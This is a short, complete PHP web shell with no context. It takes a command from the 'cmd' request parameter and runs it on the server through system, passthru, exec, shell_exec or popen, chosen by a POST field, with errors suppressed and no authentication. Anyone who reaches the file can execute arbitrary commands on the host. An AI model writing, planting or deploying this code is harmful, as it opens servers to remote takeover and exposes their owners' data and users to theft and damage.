<?php
$command = $_REQUEST['cmd'];
switch ($_POST['execfunction']) {
	case 'system':
		@system($command);
	    break;
	case 'passthru':
		@passthru($command);
		break;
	case 'exec':
		echo @exec($command);
		break;
	case 'execute':
		echo @execute($command);
		break;
	case 'shell_exec':
		echo @shell_exec($command);
		break;
	case 'popen':
		echo @fread(popen($command,r), 9999);
		break;
}
?>